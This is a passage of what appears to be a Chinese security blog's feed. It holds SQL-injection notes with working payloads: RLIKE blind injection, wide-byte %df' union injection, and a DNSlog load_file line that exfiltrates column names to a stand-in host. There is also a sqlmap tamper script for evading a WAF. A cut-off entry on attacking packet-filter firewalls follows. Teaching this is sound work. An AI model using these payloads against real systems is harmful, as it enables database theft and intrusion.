class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;count&lt;/span&gt;(&lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; information_schema.columns A, information_schema.columns B, information_schema.tables C)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;RLIKE盲注：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; flag &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; flag&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; if(mid(&lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt;(),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;,concat(rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;),rpad(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;999999&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;)) RLIKE &lt;span class=&#34;string&#34;&gt;&amp;#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;4什么是宽字节注入如何操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4什么是宽字节注入如何操作&#34;&gt;&lt;/a&gt; 4.什么是宽字节注入？如何操作？&lt;/h3&gt;
&lt;p&gt;宽字节注入：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;当php开启gpc或者使用addslashes函数时，单引号&amp;#x27;被加上反斜杠\&amp;#x27;，其中\的URL编码为%5C，我们传入%df&amp;#x27;，等价于%df%5C&amp;#x27;，此时若程序的默认字符集是GBK，mysql用GBK编码时会认为%df%5C是一个宽字符縗，于是%df%5C&amp;#x27;便等价于縗&amp;#x27;，产生注入。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;操作：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;%&lt;/span&gt;df&lt;span class=&#34;string&#34;&gt;&amp;#x27; and 1=2 union select 1,2,user(),4 %23&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;5怎样进行盲注速度更快&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5怎样进行盲注速度更快&#34;&gt;&lt;/a&gt; 5.怎样进行盲注速度更快？&lt;/h3&gt;
&lt;p&gt;DNSlog盲注：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; and load_file(concat(&amp;#x27;&lt;/span&gt;\\\\&lt;span class=&#34;string&#34;&gt;&amp;#x27;,(select column_name from information_schema.columns where table_schema=database() and table_name=&amp;#x27;&lt;/span&gt;users&lt;span class=&#34;string&#34;&gt;&amp;#x27; limit 1,1),&amp;#x27;&lt;/span&gt;.your&lt;span class=&#34;operator&#34;&gt;-&lt;/span&gt;dnslog.com\\cHr1s&lt;span class=&#34;string&#34;&gt;&amp;#x27;))--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;6什么是二次注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6什么是二次注入&#34;&gt;&lt;/a&gt; 6.什么是二次注入？&lt;/h3&gt;
&lt;p&gt;参数传入的恶意数据在传入时被转义，但是在数据库处理时又被还原并存储在数据库中，导致二次注入。&lt;/p&gt;
&lt;p&gt;举例：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;注册用户名admin&amp;#x27;#用户，传入值为admin\&amp;#x27;#，但是在存储数据库时值变为admin&amp;#x27;#，此时若修改密码为123456，管理员admin密码就被修改为123456&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;7sql注入常见的过waf方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7sql注入常见的过waf方法&#34;&gt;&lt;/a&gt; 7.sql注入常见的过WAF方法？&lt;/h3&gt;
&lt;p&gt;内联注释绕过&lt;/p&gt;
&lt;p&gt;填充大量脏数据绕过&lt;/p&gt;
&lt;p&gt;垃圾参数填充绕过&lt;/p&gt;
&lt;p&gt;改变提交方式绕过，如GET方式变为POST方式提交&lt;/p&gt;
&lt;p&gt;随机agent头绕过&lt;/p&gt;
&lt;p&gt;fuzz过滤函数，函数替换绕过&lt;/p&gt;
&lt;h3 id=&#34;8sqlmap如何编写tamper&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8sqlmap如何编写tamper&#34;&gt;&lt;/a&gt; 8.sqlmap如何编写tamper？&lt;/h3&gt;
&lt;p&gt;tamper固定模板如下：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; lib.core.enums import PRIORITY&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__priority__ &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; PRIORITY.LOW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def dependencies():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def tamper(payload, &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt;kwargs):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PROIORITY&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;用于定义tamper优先级，当调用多个tamper时生效，优先级如下，数值越大优先级越高&lt;/p&gt;
&lt;p&gt;LOWEST = -100&lt;/p&gt;
&lt;p&gt;LOWER = -50&lt;/p&gt;
&lt;p&gt;LOW = -10&lt;/p&gt;
&lt;p&gt;NORMAL = 0&lt;/p&gt;
&lt;p&gt;HIGH = 10&lt;/p&gt;
&lt;p&gt;HIGHER = 50&lt;/p&gt;
&lt;p&gt;HIGHEST = 100&lt;/p&gt;
&lt;p&gt;dependencies&lt;/p&gt;
&lt;p&gt;用于提示用户tamper适用范围，具体代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from lib.core.enums import PRIORITY&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from lib.core.common import singleTimeWarnMessage&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from lib.core.enums import DBMS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__priority__ = PRIORITY.LOW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def dependencies():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;singleTimeWarnMessage(&amp;quot;过狗tamper &amp;#x27;%s&amp;#x27; 只针对 %s&amp;quot; % (os.path.basename(__file__).split(&amp;quot;.&amp;quot;)[0], DBMS.MYSQL))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;DBMS.MYSQL代表MYSQL，其他数据库类推&lt;/p&gt;
&lt;p&gt;Tamper&lt;/p&gt;
&lt;p&gt;tamper关键函数，用于定义过滤规则，示例代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from lib.core.enums import PRIORITY&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__priority__ = PRIORITY.LOW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def tamper(payload, **kwargs):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.replace(&amp;#x27;AND&amp;#x27;,&amp;#x27;/*!29440AND*/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.replace(&amp;#x27;ORDER&amp;#x27;,&amp;#x27;/*!29440order*/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.replace(&amp;#x27;LIKE USER()&amp;#x27;,&amp;#x27;like (user/**/())&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.replace(&amp;#x27;DATABASE()&amp;#x27;,&amp;#x27;database/*!29440*/()&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.replace(&amp;#x27;CURRENT_USER()&amp;#x27;,&amp;#x27;CURRENT_USER/**/()&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.replace(&amp;#x27;SESSION_USER()&amp;#x27;,&amp;#x27;SESSION_USER(%0a)&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.replace(&amp;#x27;UNION ALL SELECT&amp;#x27;,&amp;#x27;union/*!29440select*/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.replace(&amp;#x27;super_priv&amp;#x27;,&amp;#x27;/*!29440/**/super_priv*/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.replace(&amp;#x27;and host=&amp;#x27;,&amp;#x27;/*!29440and*/host/*!11440=*/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.replace(&amp;#x27;BENCHMARK(&amp;#x27;,&amp;#x27;BENCHMARK/*!29440*/(&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.replace(&amp;#x27;SLEEP(&amp;#x27;,&amp;#x27;sleep/**/(&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;return payload&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;fuzz出具体payload后对关键字符进行替换&lt;/p&gt;
</content>
        <category term="安全" />
        <updated>2021-03-28T10:39:27.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2021/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87%E5%9F%BA%E7%A1%80/</id>
        <title>防火墙绕过基础</title>
        <link rel="alternate" href="http://example.com/2021/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87%E5%9F%BA%E7%A1%80/"/>
        <content type="html">&lt;p&gt;现在随着人们的安全意识加强，防火墙一般都被公司企业采用来保障网络的安全，一般的攻击者在有防火墙的情况下，一般是很难入侵的。下面谈谈有防火墙环境下的攻击和检测。&lt;/p&gt;
&lt;h1 id=&#34;一-防火墙基本原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一-防火墙基本原理&#34;&gt;&lt;/a&gt; 一 防火墙基本原理&lt;/h1&gt;
&lt;p&gt;首先，我们需要了解一些基本的防火墙实现原理。防火墙目前主要分包过滤，和状态检测的包过滤，应用层代理防火墙。但是他们的基本实现都是类似的。&lt;/p&gt;
&lt;p&gt;│ │—路由器-----网卡│防火墙│网卡│----------内部网络│ │&lt;/p&gt;
&lt;p&gt;防火墙一般有两个以上的网络卡，一个连到外部（router)，另一个是连到内部网络。当打开主机网络转发功能时，两个网卡间的网络通讯能直接通过。当有防火墙时，他好比插在网卡之间，对所有的网络通讯进行控制。&lt;/p&gt;
&lt;p&gt;说到访问控制，这是防火墙的核心了：），防火墙主要通过一个访问控制表来判断的，他的形式一般是一连串的如下规则：&lt;/p&gt;
&lt;p&gt;1 accept from+ 源地址，端口 to+ 目的地址，端口+ 采取的动作&lt;/p&gt;
&lt;p&gt;2 deny …（deny就是拒绝。。)&lt;/p&gt;
&lt;p&gt;3 nat …(nat是地址转换。后面说）&lt;/p&gt;
&lt;p&gt;防火墙在网络层（包括以下的炼路层）接受到网络数据包后，就从上面的规则连表一条一条地匹配，如果符合就执行预先安排的动作了！如丢弃包。。。。&lt;/p&gt;
&lt;p&gt;但是，不同的防火墙，在判断攻击行为时，有实现上的差别。下面结合实现原理说说可能的攻击。&lt;/p&gt;
&lt;h1 id=&#34;二-攻击包过滤防火墙&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二-攻击包过滤防火墙&#34;&gt;&lt;/a&gt; 二 攻击包过滤防火墙&lt;/h1&gt;
&lt;p&gt;包过滤防火墙是最简单的一种了，它在网络层截获网络数据包，根据防火墙的规则表，来检测攻击行为。他根据数据包的源IP地址；目的IP地址；TCP/UDP源端口；TCP/UDP目的端口来过滤！！很容易受到如下攻击：&lt;/p&gt;
&lt;h2 id=&#34;1-ip-欺骗攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-ip-欺骗攻击&#34;&gt;&lt;/a&gt; 1 ip 欺骗攻击：&lt;/h2&gt;
&lt;p&gt;这种攻击，主要是修改数据包的源，目的地址和端口，模仿一些合法的数据包来骗过防火墙的检测。如：外部攻击者，将他的数据报源地址改为内部网络地址，防火墙看到是合法地址就放行了：）。可是，如果防火墙能结合接口，地址来匹配，这种攻击就不能成功了：（&lt;/p&gt;
&lt;h2 id=&#34;2-dos拒绝服务攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-dos拒绝服务攻击&#34;&gt;&lt;/a&gt; 2 d.o.s拒绝服务攻击&lt;/h2&gt;
&lt;p&gt;简单的包过滤防火墙不能跟踪 tcp的状态，很容易受到拒绝服务攻击，一旦防火墙受到d.o.s攻击，他可能会忙于处理，而忘记了他自己的过滤功能。：）你就可以饶过了，不过这样攻击还很少的。！&lt;/p&gt;
&lt;h2 id=&#34;3-分片攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-分片攻击&#34;&gt;&lt;/a&gt; 3 分片攻击&lt;/h2&gt;
&lt;p&gt;这种攻击的原理是：在IP的分片包中，所有的分片包用一个分片偏移字段标志分片包的顺序，但是，只有第一个分片包含有TCP端口号的信息。当IP分片包通过分组过滤防火墙时，防火墙只根据第一个分片包的Tcp信息判断是否允许通过，而其他后续的分片不作防火墙检测，直接让它们通过。&lt;/p&gt;
&lt;p&gt;这样，攻击者就可以通过先发送第一个合法的IP分片，骗过防火墙的检测，接着封装了恶意数据的后续分片包就可以直接穿透防火墙，直接到达内部网络主机，从而威胁网络和主机的安全。&lt;/p&gt;
&lt;h2 id=&#34;4-木马攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-木马攻击&#34;&gt;&lt;/a&gt; 4 木马攻击&lt;/h2&gt;
&lt;p&gt;对于包过滤防火墙最有效的攻击就是木马了，一但你在内部网络安装了木马，防火墙基本上是无能为力的。&lt;/p&gt;
&lt;p&gt;原因是：包过滤防火墙一般只过滤低端口（1-1024），而高端口他不可能过滤的（因为，一些服务要用到高端口，因此防火墙不能关闭高端口的），所以很多的木马都在高端口打开等待，如冰河，subseven等。。。&lt;/p&gt;
